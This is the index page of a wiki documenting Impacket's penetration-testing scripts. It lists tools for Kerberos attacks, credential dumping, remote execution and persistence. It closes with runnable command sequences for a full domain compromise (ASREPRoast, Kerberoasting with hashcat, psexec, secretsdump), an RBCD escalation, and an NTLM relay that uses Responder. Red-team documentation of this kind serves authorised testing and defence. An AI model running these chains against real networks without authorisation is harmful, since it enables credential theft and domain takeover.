# Impacket Examples Wiki

This wiki provides comprehensive documentation for all Impacket example scripts. Impacket is a collection of Python classes for working with network protocols, widely used in penetration testing and red team operations.

## Table of Contents

### Authentication & Credential Attacks
- [addcomputer.py](addcomputer.md) - Add computer accounts to domain
- [changepasswd.py](changepasswd.md) - Change user passwords
- [GetNPUsers.py](GetNPUsers.md) - ASREPRoast attack
- [GetUserSPNs.py](GetUserSPNs.md) - Kerberoasting attack
- [getST.py](getST.md) - Service ticket requests
- [getTGT.py](getTGT.md) - Ticket granting ticket requests
- [goldenPac.py](goldenPac.md) - Golden PAC attack
- [keylistattack.py](keylistattack.md) - KeyList attack
- [ticketer.py](ticketer.md) - Golden/Silver ticket creation
- [ticketConverter.py](ticketConverter.md) - Convert ticket formats

### Credential Dumping & Extraction
- [secretsdump.py](secretsdump.md) - Extract credentials from Windows systems
- [DumpNTLMInfo.py](DumpNTLMInfo.md) - Dump NTLM authentication info
- [mimikatz.py](mimikatz.py) - Mimikatz-like functionality
- [dpapi.py](dpapi.md) - DPAPI blob decryption
- [regsecrets.py](regsecrets.md) - Extract secrets from registry

### Remote Command Execution
- [psexec.py](psexec.md) - PsExec-like remote execution
- [smbexec.py](smbexec.md) - SMB-based remote execution
- [wmiexec.py](wmiexec.md) - WMI-based remote execution
- [dcomexec.py](dcomexec.md) - DCOM-based remote execution
- [atexec.py](atexec.md) - Scheduled task execution

### Active Directory Enumeration
- [GetADUsers.py](GetADUsers.md) - Enumerate AD users
- [GetADComputers.py](GetADComputers.md) - Enumerate AD computers
- [findDelegation.py](findDelegation.md) - Find delegation relationships
- [GetLAPSPassword.py](GetLAPSPassword.md) - Extract LAPS passwords
- [Get-GPPPassword.py](Get-GPPPassword.md) - Extract Group Policy passwords

### Privilege Escalation & Persistence
- [dacledit.py](dacledit.md) - Edit DACL permissions
- [owneredit.py](owneredit.md) - Edit object ownership
- [rbcd.py](rbcd.md) - Resource-based constrained delegation
- [raiseChild.py](raiseChild.md) - Child to parent domain privilege escalation
- [wmipersist.py](wmipersist.md) - WMI-based persistence

### Network Services & Protocols
- [smbclient.py](smbclient.md) - SMB client functionality
- [smbserver.py](smbserver.md) - SMB server implementation
- [mssqlclient.py](mssqlclient.md) - MSSQL client
- [mssqlinstance.py](mssqlinstance.md) - MSSQL instance enumeration
- [rpcdump.py](rpcdump.md) - RPC endpoint enumeration
- [rpcmap.py](rpcmap.md) - RPC endpoint mapping
- [sambaPipe.py](sambaPipe.md) - Samba pipe operations

### Registry & System Operations
- [reg.py](reg.md) - Remote registry operations
- [registry-read.py](registry-read.md) - Read registry remotely
- [services.py](services.md) - Windows service management
- [ntfs-read.py](ntfs-read.md) - NTFS file system operations

### Information Gathering
- [lookupsid.py](lookupsid.md) - SID lookup and enumeration
- [samrdump.py](samrdump.md) - SAM database enumeration
- [netview.py](netview.md) - Network view enumeration
- [net.py](net.md) - Network operations
- [machine_role.py](machine_role.md) - Determine machine role

### Network Analysis & Monitoring
- [sniff.py](sniff.md) - Network packet sniffing
- [sniffer.py](sniffer.md) - Advanced packet sniffing
- [kintercept.py](kintercept.md) - Kerberos interception
- [karmaSMB.py](karmaSMB.md) - SMB honeypot

### Utilities & Miscellaneous
- [ping.py](ping.md) - ICMP ping utility
- [ping6.py](ping6.md) - IPv6 ping utility
- [split.py](split.md) - File splitting utility
- [exchanger.py](exchanger.md) - Exchange server operations
- [esentutl.py](esentutl.md) - ESE database utilities
- [getArch.py](getArch.md) - Architecture detection
- [getPac.py](getPac.md) - PAC information extraction
- [describeTicket.py](describeTicket.md) - Kerberos ticket analysis
- [tstool.py](tstool.md) - Terminal services operations
- [mqtt_check.py](mqtt_check.md) - MQTT protocol testing
- [rdp_check.py](rdp_check.md) - RDP service checking
- [wmiquery.py](wmiquery.md) - WMI query execution

## Attack Chains & Methodologies

Many of these tools can be chained together for comprehensive attacks:

1. **Domain Enumeration Chain**: GetADUsers.py → GetUserSPNs.py → GetNPUsers.py
2. **Credential Dumping Chain**: secretsdump.py → mimikatz.py → dpapi.py
3. **Lateral Movement Chain**: psexec.py → smbexec.py → wmiexec.py
4. **Privilege Escalation Chain**: dacledit.py → rbcd.py → getST.py
5. **Persistence Chain**: wmipersist.py → services.py → reg.py

## Getting Started

Each tool documentation includes:
- Overview and purpose
- Detailed description of functionality
- Command-line options and parameters
- Usage examples
- Attack chain integration
- Detection considerations

## Additional Resources

- **[Quick Reference Guide](QUICK_REFERENCE.md)**: Essential commands and syntax for all tools
- **[Attack Methodologies](ATTACK_METHODOLOGIES.md)**: Comprehensive attack chains and methodologies
- **[Tool Generator](generate_docs.py)**: Script to generate documentation templates

## Attack Chain Examples

### Complete Domain Compromise Chain
```bash
# 1. Initial reconnaissance
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# 2. Crack obtained hashes
hashcat -m 18200 hashes.txt wordlist.txt

# 3. Use cracked credentials for Kerberoasting
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# 4. Crack service account passwords
hashcat -m 13100 service_hashes.txt wordlist.txt

# 5. Use service account for lateral movement
python3 psexec.py domain.com/service_account:password@target.domain.com

# 6. Extract all domain credentials
python3 secretsdump.py domain.com/service_account:password@dc.domain.com -just-dc
```

### RBCD Privilege Escalation Chain
```bash
# 1. Add computer account
python3 addcomputer.py domain.com/user:password -computer-name EVIL$ -computer-pass Pass123

# 2. Configure RBCD
python3 rbcd.py domain.com/user:password -action write -delegate-from EVIL$ -delegate-to TARGET$

# 3. Request service ticket
python3 getST.py domain.com/EVIL$:Pass123 -spn cifs/TARGET$ -impersonate administrator

# 4. Use ticket for access
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass TARGET$
```

### NTLM Relay Attack Chain
```bash
# 1. Set up relay (Terminal 1)
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# 2. Capture authentication (Terminal 2)
python3 Responder.py -I eth0 -w

# 3. Trigger authentication (various methods)
# - Send malicious document with UNC path
# - Social engineering web requests
# - WPAD poisoning
```

## Contributing

To contribute to this wiki, please follow the established format for each tool documentation. Use the `generate_docs.py` script to create new documentation templates.
